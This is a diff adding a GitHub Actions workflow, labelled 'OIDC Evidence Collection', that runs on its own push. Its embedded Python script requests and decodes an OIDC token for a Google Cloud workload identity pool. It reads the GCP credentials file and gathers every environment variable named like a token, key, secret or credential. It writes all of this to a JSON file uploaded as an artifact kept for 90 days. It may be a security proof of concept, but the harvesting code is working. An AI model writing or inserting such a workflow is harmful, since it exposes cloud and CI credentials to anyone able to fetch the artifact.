@@ -1,0 +1,95 @@
+name: OIDC Evidence Collection v3
+
+on:
+  push:
+    paths:
+      - .github/workflows/oidc-evidence-v3.yml
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  collect-evidence:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+
+      - name: Authenticate to Google Cloud via OIDC
+        uses: google-github-actions/auth@v2
+        with:
+          workload_identity_provider: "projects/72497726731/locations/global/workloadIdentityPools/ai-review/providers/ai-review"
+          service_account: "ai-review@dev-inf-prod.iam.gserviceaccount.com"
+        continue-on-error: true
+
+      - name: Collect and save evidence
+        run: |
+          python3 << 'PYEOF'
+import json, os, base64
+
+evidence = {}
+
+# 1. ACTIONS_ID_TOKEN_REQUEST_TOKEN
+token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
+evidence["ACTIONS_ID_TOKEN_REQUEST_TOKEN"] = token
+
+# 2. ACTIONS_ID_TOKEN_REQUEST_URL
+evidence["ACTIONS_ID_TOKEN_REQUEST_URL"] = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
+
+# 3. Request OIDC JWT
+import urllib.request
+url = evidence["ACTIONS_ID_TOKEN_REQUEST_URL"]
+if url and token:
+    req = urllib.request.Request(
+        url + "&audience=https://iam.googleapis.com/projects/72497726731/locations/global/workloadIdentityPools/ai-review/providers/ai-review",
+        headers={"Authorization": f"Bearer {token}"}
+    )
+    try:
+        resp = urllib.request.urlopen(req, timeout=10)
+        oidc_data = json.loads(resp.read().decode())
+        evidence["OIDC_JWT"] = oidc_data.get("value", "")
+        
+        # Decode JWT
+        jwt_val = evidence["OIDC_JWT"]
+        if jwt_val:
+            parts = jwt_val.split(".")
+            header = json.loads(base64.b64decode(parts[0] + "=="))
+            payload = json.loads(base64.b64decode(parts[1] + "=="))
+            evidence["OIDC_JWT_HEADER"] = header
+            evidence["OIDC_JWT_PAYLOAD"] = payload
+    except Exception as e:
+        evidence["OIDC_JWT_ERROR"] = str(e)
+
+# 4. GCP Credentials
+gcp_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
+evidence["GOOGLE_APPLICATION_CREDENTIALS_PATH"] = gcp_path
+if gcp_path and os.path.exists(gcp_path):
+    with open(gcp_path) as f:
+        evidence["GCP_CREDENTIALS"] = json.load(f)
+
+# 5. All sensitive env vars
+sensitive = {}
+for k, v in os.environ.items():
+    if any(x in k for x in ["TOKEN", "KEY", "SECRET", "CREDENTIAL", "AUTH", "GOOGLE", "CLOUD"]):
+        sensitive[k] = v
+evidence["SENSITIVE_ENV_VARS"] = sensitive
+
+# 6. Metadata
+evidence["GCP_PROJECT"] = os.environ.get("CLOUDSDK_CORE_PROJECT", "")
+evidence["GITHUB_REPOSITORY"] = os.environ.get("GITHUB_REPOSITORY", "")
+evidence["GITHUB_RUN_ID"] = os.environ.get("GITHUB_RUN_ID", "")
+evidence["GITHUB_RUN_URL"] = f"https://github.com/{os.environ.get('GITHUB_REPOSITORY','')}/actions/runs/{os.environ.get('GITHUB_RUN_ID','')}"
+
+with open("evidence.json", "w") as f:
+    json.dump(evidence, f, indent=2)
+
+print(f"Evidence collected: {len(json.dumps(evidence))} bytes")
+PYEOF
+
+      - name: Upload evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: oidc-evidence
+          path: evidence.json
+          retention-days: 90
